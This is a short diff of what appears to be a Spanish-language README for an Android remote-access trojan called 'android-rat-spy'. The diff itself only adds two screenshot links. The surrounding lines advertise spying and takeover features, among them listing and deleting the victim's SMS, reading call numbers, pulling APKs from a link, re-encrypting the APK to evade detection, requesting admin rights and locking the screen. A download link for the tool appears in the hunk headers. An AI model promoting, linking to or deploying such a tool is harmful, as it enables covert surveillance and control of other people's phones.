@@ -50,6 +50,7 @@ DESGARGA:https://nibiruanuna.wixsite.com/android-rat-spy
 🟢Mostrar lista de SMS
 🟢Eliminar SMS
 💠𝗘𝘅𝘁𝗿𝗮 𝗧𝗼𝗼𝗹𝘀
+![2](https://user-images.githubusercontent.com/122752289/216728512-f94a8c17-eaa8-4d53-b6d9-906d61143586.png)
 
 🟢Número de llamada
 🟢Descargar Apk desde el enlace
@@ -93,6 +94,7 @@ DESGARGA:https://nibiruanuna.wixsite.com/android-rat-spy
 🟢Soporte de pantalla de bloqueo
 🟢Vuelva a cifrar el apk
 💠𝗔𝗱𝗺𝗶𝗻 𝗥𝗶𝗴𝗵𝘁𝘀
+![1](https://user-images.githubusercontent.com/122752289/216728545-c2da42b4-b5dd-4de5-be81-21bdf737d57f.png)
 
 🟢Solicitar derechos de administrador
 🟢Bloquear pantalla
